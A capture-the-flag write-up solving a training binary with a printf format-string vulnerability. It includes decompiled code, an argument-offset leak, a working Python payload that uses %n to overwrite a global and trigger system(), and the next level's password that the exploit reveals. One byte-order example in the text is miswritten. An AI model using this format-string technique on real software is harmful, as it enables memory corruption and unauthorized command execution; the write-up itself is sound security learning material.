    scp -P 4242 level4@10.11.200.132:/home/user/level4/level4 .

<hr>

Decompilation of the binary:
```
        int32_t main(int32_t argc, char** argv, char** envp)

            080484b3  return n()

        
        uint32_t n()

            0804847a  void var_20c
            0804847a  fgets(&var_20c, 0x200, *stdin)
            08048488  p(&var_20c)
            0804848d  uint32_t eax_1 = *m
            08048492  if (eax_1 == 16930116)
            080484a0      eax_1 = system("/bin/cat /home/user/level5/.pass")
            080484a6  return eax_1


        int32_t p(int32_t arg1)

            08048456  return printf(arg1)
```
<hr>

```
python -c 'print "A"*20 + "%p "*20' | ./level4
AAAAAAAAAAAAAAAAAAAA0xb7ff26b0 0xbffff794 0xb7fd0ff4 (nil) (nil) 0xbffff758 0x804848d
0xbffff550 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x41414141 0x41414141 0x41414141
0x41414141 0x25207025 0x70252070 0x20702520 0x25207025
```
A(0x41414141) is written in the 12th parameter

<hr>
Same as before, it looks like we have to write to *m address to verify the value 16930116. 

Dump of assembler code for function n:
```   0x08048457 <+0>:     push   %ebp
   0x08048458 <+1>:     mov    %esp,%ebp
   0x0804845a <+3>:     sub    $0x218,%esp
   0x08048460 <+9>:     mov    0x8049804,%eax
   0x08048465 <+14>:    mov    %eax,0x8(%esp)
   0x08048469 <+18>:    movl   $0x200,0x4(%esp)
   0x08048471 <+26>:    lea    -0x208(%ebp),%eax
   0x08048477 <+32>:    mov    %eax,(%esp)
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>
   0x0804847f <+40>:    lea    -0x208(%ebp),%eax
   0x08048485 <+46>:    mov    %eax,(%esp)
   0x08048488 <+49>:    call   0x8048444 <p>
   0x0804848d <+54>:    mov    0x8049810,%eax           ## the address to write
   0x08048492 <+59>:    cmp    $0x1025544,%eax
   0x08048497 <+64>:    jne    0x80484a5 <n+78>
   0x08048499 <+66>:    movl   $0x8048590,(%esp)
   0x080484a0 <+73>:    call   0x8048360 <system@plt>
```

``0x8049810`` -> ``\x10\x98\x49\x80``

Padding now should be 16930116 length - the length of the target address.
Printf allows us to create this padding on execution by using "%(16930116-4)u%12$n"

Building the string:

    python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n" ' > /dev/shm/ex; cat /dev/shm/ex - | ./level4

at the end of the output:
    0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

    Bingo :D